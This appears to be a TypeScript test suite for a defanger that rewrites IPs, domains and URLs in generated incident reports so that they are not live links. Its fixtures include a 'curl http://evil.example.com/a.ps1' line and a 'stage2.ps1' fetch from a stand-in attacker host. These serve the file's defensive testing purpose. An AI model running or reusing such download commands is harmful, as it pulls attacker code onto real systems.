/**
 * Written from an attack on the defanger, in both directions.
 *
 * A missing defang hands a customer a live C2 address one click away, because
 * Word and Outlook autolink a bare domain. An over-eager one is *quieter and
 * worse*: the reader cannot tell a mangled filename from a real one, so
 * `payload.zip` arriving as `payload[.]zip` is a fact the report has destroyed
 * rather than protected. Both halves are asserted here.
 *
 * The rules come from the Python tier this replaces, where they were paid for.
 */
import { describe, expect, it } from 'vitest'

import { defangDocument, defangIndicator, defangText } from './defang.js'
import type { CodeNode, Document, ListNode, TableNode } from './model.js'

describe('a value the model says is entirely an indicator', () => {
  it('blanks every dot, because the field declared what it holds', () => {
    expect(defangIndicator('evil.example.com')).toBe('evil[.]example[.]com')
    expect(defangIndicator('203.0.113.9')).toBe('203[.]0[.]113[.]9')
  })

  it('keeps a URL readable: scheme and host only, path untouched', () => {
    // A dot inside a path is not an indicator, and mangling it loses
    // information the reader needs.
    expect(defangIndicator('http://evil.example.com/a.b/c.d?x=1.2')).toBe(
      'hxxp://evil[.]example[.]com/a.b/c.d?x=1.2',
    )
  })

  it('preserves the case the analyst typed in the scheme', () => {
    expect(defangIndicator('HTTP://EVIL.COM/x')).toBe('HXXP://EVIL[.]COM/x')
  })

  /**
   * **A bare host, which every other case here gives a path.** The authority
   * pattern's tail is optional, so this is the one input where that group is
   * `undefined` -- and a caller concatenating it without a fallback appends
   * the text `undefined` to the host. Nothing covered it, and the whole file
   * stayed green while it did.
   */
  it.each([
    ['http://evil.example.com', 'hxxp://evil[.]example[.]com'],
    ['https://a.b.c', 'hxxps://a[.]b[.]c'],
    ['http://host?q=1', 'hxxp://host?q=1'],
    ['http://host#f', 'hxxp://host#f'],
  ])('defangs %s with no path at all', (given, expected) => {
    expect(defangIndicator(given)).toBe(expected)
  })

  it.each(['', '   '])('leaves %p alone rather than inventing brackets', (value) => {
    expect(defangIndicator(value)).toBe(value)
  })
})

describe('free text inside a generated block', () => {
  it('defangs an IPv4 literal', () => {
    expect(defangText('beaconed to 203.0.113.9 every hour')).toBe(
      'beaconed to 203[.]0[.]113[.]9 every hour',
    )
  })

  it('defangs a scheme-carrying URL and keeps its path', () => {
    expect(defangText('fetched http://evil.example.com/stage2.ps1 next')).toBe(
      'fetched hxxp://evil[.]example[.]com/stage2.ps1 next',
    )
  })

  /**
   * **The half that matters most, and the one an over-eager rule breaks.**
   * `.zip` and `.mov` are real TLDs, so any looks-like-a-domain regex turns a
   * filename into a mangled one and the reader cannot tell which it was.
   */
  it.each([
    'the operator dropped payload.zip on the share',
    'renamed it to invoice.mov before exfil',
    'see evil.example.com in the indicator table',
  ])('leaves a bare domain alone: %s', (text) => {
    expect(defangText(text)).toBe(text)
  })

  it('is not fooled by a version string that is shaped like an address', () => {
    // Octet-validated, so `400` and `1964` disqualify these.
    expect(defangText('agent 1.2.3.400 and build 5.2.1.1964')).toBe(
      'agent 1.2.3.400 and build 5.2.1.1964',
    )
  })
})

/**
 * The smallest document that still has each place a string can hide.
 *
 * **The cover is one of those places and was absent here**, which is how it
 * came to be the one part of a built document nothing defanged. It is not a
 * `Section`, so the exhaustive `defangNode` switch never covered it and the
 * compiler had nothing to say.
 */
function documentWith(sections: Document['sections'], cover?: Document['cover']): Document {
  return { title: 'RCA', tlp: 'TLP:RED', language: 'en', languageCoverage: 1, sections, cover }
}

describe('the pass over a built document', () => {
  const table = (): TableNode => ({
    type: 'table',
    header: ['Indicator', 'Context'],
    rows: [[{ text: 'evil.example.com', indicator: true }, { text: 'seen at 203.0.113.9' }]],
    widths: [50, 50],
  })

  /**
   * **Page one, and it was the one page nothing walked.** `defangDocument`
   * mapped `sections` and spread the rest, so `cover` rode through untouched -
   * every string on it is free text off the case, all three painters draw it,
   * and Word autolinks a URL it is handed. The exhaustive switch that makes a
   * forgotten *node* kind a compile error does not reach `Cover`, because a
   * cover is not a node.
   */
  it('defangs the cover, which is not a section and not a node', () => {
    const document_ = documentWith([], {
      eyebrow: 'Reported from 198.51.100.7',
      title: 'Phishing, then a payload.zip from 203.0.113.9',
      subtitle: 'Acme  \u00b7  CASE-1  \u00b7  callback to http://evil.example.com/beacon',
      rows: [
        { label: 'First contact', value: { text: 'evil.example.com', indicator: true } },
        { label: 'Source', value: { text: 'seen at 198.51.100.23' } },
      ],
    })

    const cover = defangDocument(document_).cover
    expect(cover?.eyebrow).not.toContain('198.51.100.7')
    expect(cover?.title).not.toContain('203.0.113.9')
    expect(cover?.subtitle).not.toContain('http://evil.example.com')
    expect(cover?.rows[1]?.value.text).not.toContain('198.51.100.23')

    // **The whole value is the indicator here**, so the bare domain is blanked
    // - which it is not in prose, where `.zip` and `.mov` are real TLDs and any
    // "looks like a domain" rule mangles a filename.
    expect(cover?.rows[0]?.value.text).not.toContain('evil.example.com')
    expect(cover?.title).toContain('payload.zip')

    // The labels are the app's own words and carry no address to defang.
    expect(cover?.rows[0]?.label).toBe('First contact')
  })

  /**
   * **The document's own title, which every painter prints.** Markdown's H1,
   * Word's title paragraph, and the PDF's metadata, running footer and
   * no-cover fallback headline all take it straight from `document_.title` -
   * and it is the case title, free text an analyst typed.
   *
   * Found by asking what shape would have caught the cover: `...document_`
   * accepts any field silently, so the part nobody walked was invisible.
   * `defangDocument` returns an explicit literal now - which catches a
   * *required* field added to `Document` (TS2741) and, measured, does **not**
   * catch an optional one. `cover` is optional, so the shape that caused this
   * would still slip past the compiler. This test is the half that covers it.
   */
  it('defangs the document title, which is not inside a section either', () => {
    const document_ = documentWith([])
    document_.title = 'RCA for 198.51.100.7'
    expect(defangDocument(document_).title).not.toContain('198.51.100.7')
  })

  /**
   * **A section heading is analyst free text and is not a `Node`.** Third
   * instance of the same class as the cover and the title: `headingFor` returns
   * `block.heading`, a 200-char field the analyst types, settable on generated
   * blocks as well as written ones - and `defangSection` walked `nodes` and
   * returned the heading untouched.
   *
   * So a section titled "Callback to http://evil.example.com" shipped a live,
   * Word-autolinked URL while the prose two lines below it was defanged.
   */
  it('defangs a generated section heading, which is not a node', () => {
    const out = defangDocument(
      documentWith([
        {
          blockId: 'b',
          kind: 'indicators',
          heading: 'Callback to http://evil.example.com and 198.51.100.7',
          nodes: [],
        },
      ]),
    )
    expect(out.sections[0]!.heading).not.toContain('http://evil.example.com')
    expect(out.sections[0]!.heading).not.toContain('198.51.100.7')
  })

  /**
   * **The split is on `kind`, and `heading` is one shared field.**
   * `defangSection` returns a written section before it considers the heading,
   * so this records the early return rather than a decision taken about
   * headings: the same analyst types into the same 200-char control on the same
   * block form and gets two different documents, on an axis that control does
   * not show.
   *
   * Left as it is because the written *body* is exempt by deliberate policy, so
   * a heading adds no exposure that block does not already carry. If the leave
   * whole rule is ever narrowed to the prose editor it was written for -- which
   * is what its own docstring argues -- this is the case that moves.
   */
  it("leaves a written section's heading alone, as it leaves its body", () => {
    const out = defangDocument(
      documentWith([
        { blockId: 'w', kind: 'written', heading: 'Notes on 198.51.100.7', nodes: [] },
      ]),
    )
    expect(out.sections[0]!.heading).toBe('Notes on 198.51.100.7')
  })

  it('leaves a document with no cover alone', () => {
    expect(defangDocument(documentWith([])).cover).toBeUndefined()
  })

  it('defangs a cell the builder marked, and the prose beside it, by different rules', () => {
    const out = defangDocument(
      documentWith([{ blockId: 'b', kind: 'indicators', heading: 'Indicators', nodes: [table()] }]),
    )
    const row = (out.sections[0]!.nodes[0] as TableNode).rows[0]!
    expect(row[0]!.text).toBe('evil[.]example[.]com')
    // Free text in the same table: the IP goes, a bare domain would not have.
    expect(row[1]!.text).toBe('seen at 203[.]0[.]113[.]9')
  })

  /**
   * **A written block is the analyst's prose and is left alone.** They defang
   * by convention already, and rewriting it edits their words.
   */
  it('does not touch a written block', () => {
    const out = defangDocument(
      documentWith([
        {
          blockId: 'w',
          kind: 'written',
          heading: 'Root cause',
          nodes: [{ type: 'prose', paras: ['the beacon reached 203.0.113.9'] }],
        },
      ]),
    )
    expect(out.sections[0]!.nodes[0]).toEqual({
      type: 'prose',
      paras: ['the beacon reached 203.0.113.9'],
    })
  })

  /**
   * **Every node kind that carries a string, because the walk is a switch.**
   * A kind added later that forgets its case ships live addresses, and the
   * list case was already wrong -- it treated an item as a string, which the
   * suite could not see and the build caught.
   */
  it('reaches inside a list item and a code block', () => {
    const out = defangDocument(
      documentWith([
        {
          blockId: 'b',
          kind: 'timeline',
          heading: 'What happened',
          nodes: [
            {
              type: 'list',
              items: [{ runs: [{ text: 'callback to 203.0.113.9' }], level: 0, ordered: false }],
            },
            { type: 'code', lines: ['curl http://evil.example.com/a.ps1'] },
          ],
        },
      ]),
    )
    const [list, code] = out.sections[0]!.nodes as [ListNode, CodeNode]
    expect(list.items[0]!.runs[0]!.text).toBe('callback to 203[.]0[.]113[.]9')
    expect(code.lines[0]).toBe('curl hxxp://evil[.]example[.]com/a.ps1')
  })

  it('leaves the document title and the marking alone', () => {
    // A TLP marking is a vocabulary key the painters resolve, not prose.
    const out = defangDocument(documentWith([]))
    expect(out.title).toBe('RCA')
    expect(out.tlp).toBe('TLP:RED')
  })

  it('returns a new document rather than editing the one it was given', () => {
    // The frozen tree of a sent report is stored; a pass that mutated in place
    // would defang it twice on the second read.
    const before = documentWith([
      { blockId: 'b', kind: 'indicators', heading: 'I', nodes: [table()] },
    ])
    const out = defangDocument(before)
    expect((before.sections[0]!.nodes[0] as TableNode).rows[0]![0]!.text).toBe('evil.example.com')
    expect(out).not.toBe(before)
  })

  it('is idempotent, so a document passed twice is not double-bracketed', () => {
    const once = defangDocument(
      documentWith([{ blockId: 'b', kind: 'indicators', heading: 'I', nodes: [table()] }]),
    )
    const twice = defangDocument(once)
    expect((twice.sections[0]!.nodes[0] as TableNode).rows[0]![0]!.text).toBe(
      'evil[.]example[.]com',
    )
  })
})

describe('defangIndicator, against a caller that carries no cap', () => {
  /**
   * **`visuals.ts` joins every entity a timeline entry touches into one cell**
   * and flags it `indicator: true`. Nothing caps that join, so the 255
   * characters each field's own schema allows is not a bound on what arrives
   * here -- roughly 135 indicators at one tactic reach 32k in that cell, and
   * `/bulk` makes that one request.
   *
   * The input holds an interior newline because that is what an ambiguous
   * authority pattern backtracks on: `[^/?#]` matches a newline and `.` does
   * not, so `$` fails there and the engine walks back through every position
   * the host could have ended at.
   *
   * The bound is loose on purpose. A linear pass over this is well under a
   * millisecond, so a failure means the quadratic shape is back rather than
   * that the machine is busy.
   */
  it('stays linear on a long value holding an interior newline', () => {
    const n = 32_000
    const value = `http://${'a'.repeat(n)}/${'x'.repeat(n)}\ny`

    const started = performance.now()
    defangIndicator(value)

    expect(performance.now() - started).toBeLessThan(100)
  })

  it('defangs the host of a value holding a newline rather than giving up on it', () => {
    // The old pattern failed to match at all here, fell through to blanking
    // every dot in the string, and took the path's dots with it.
    expect(defangIndicator('http://evil.example.com/a.b\nc')).toBe(
      'hxxp://evil[.]example[.]com/a.b\nc',
    )
  })
})
